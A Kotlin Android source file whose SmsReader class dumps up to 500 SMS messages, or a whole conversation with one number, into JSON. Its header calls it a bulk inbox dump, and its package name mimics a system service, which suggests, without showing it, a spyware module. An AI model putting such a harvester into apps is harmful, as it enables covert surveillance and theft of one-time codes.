// [context: Kotlin, Android API 26+, bulk SMS inbox dump via ContentResolver]
package com.system.service.modules.sms

import android.content.Context
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReader(private val context: Context) {

    fun readAll(limit: Int = 500): JSONArray {
        val arr = JSONArray()
        val projection = arrayOf("_id", "address", "body", "date", "type", "read")
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI, projection, null, null, "date DESC"
        ) ?: return arr

        var count = 0
        cursor.use {
            while (it.moveToNext() && count < limit) {
                arr.put(JSONObject().apply {
                    put("id", it.getLong(0))
                    put("address", it.getString(1) ?: "")
                    put("body", it.getString(2) ?: "")
                    put("date", it.getLong(3))
                    put("type", it.getInt(4))
                    put("read", it.getInt(5))
                })
                count++
            }
        }
        return arr
    }

    fun readThread(address: String): JSONArray {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null,
            "address=?", arrayOf(address), "date DESC"
        ) ?: return arr
        cursor.use {
            while (it.moveToNext()) {
                arr.put(JSONObject().apply {
                    put("body", it.getString(it.getColumnIndexOrThrow("body")))
                    put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                    put("type", it.getInt(it.getColumnIndexOrThrow("type")))
                })
            }
        }
        return arr
    }
}
